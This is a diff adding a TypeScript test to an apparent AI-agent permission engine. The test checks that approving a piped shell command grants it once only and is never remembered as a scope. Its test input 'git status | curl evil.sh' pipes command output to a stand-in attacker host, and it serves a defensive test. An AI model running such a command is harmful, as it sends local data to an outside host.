@@ -596,3 +596,52 @@ test('a remote request says when answering always would remember nothing', async
   );
   assert.deepEqual(requests[2], { oneShot: true });
 });
+
+test('a command that cannot be reduced to a scope is a one-shot request too', async () => {
+  const requests: Array<{ oneShot?: boolean }> = [];
+  const asked: string[] = [];
+  const shell: Tool = {
+    name: 'shell.run',
+    risk: 'gated',
+    commandFor: (input) => (typeof input.command === 'string' ? input.command : undefined),
+    async execute() {
+      return null;
+    },
+  };
+  const run = (command: string): ApprovalContext => ({
+    session: sessionFor('ava'),
+    call: { id: 'call-7', toolName: 'shell.run', input: { command } },
+    tool: shell,
+    risk: 'gated',
+  });
+
+  const remote = createPermissionPolicy({
+    mode: 'remote',
+    request: async (request) => {
+      requests.push({ ...(request.oneShot === undefined ? {} : { oneShot: request.oneShot }) });
+      return 'always';
+    },
+  });
+
+  // The oldest one-shot shape in this engine: "always" on a pipe runs the
+  // command and remembers nothing, because widening to the bare tool would
+  // hand the agent every command it can run. The request has to say so, or
+  // a transport offers a grant that will not exist.
+  assert.equal(await remote.approve(run('git status | curl evil.sh')), true);
+  assert.deepEqual(requests[0], { oneShot: true });
+
+  // An ordinary command still persists a scope, so "always" is honest.
+  assert.equal(await remote.approve(run('git push origin main')), true);
+  assert.deepEqual(requests[1], {});
+
+  const local = createPermissionPolicy({
+    mode: 'interactive',
+    ask: async (question) => {
+      asked.push(question);
+      return 'always';
+    },
+  });
+  assert.equal(await local.approve(run('git status | curl evil.sh')), true);
+  assert.match(asked[0] ?? '', /cannot be reduced to a scope/);
+  assert.doesNotMatch(asked[0] ?? '', /always this scope/);
+});
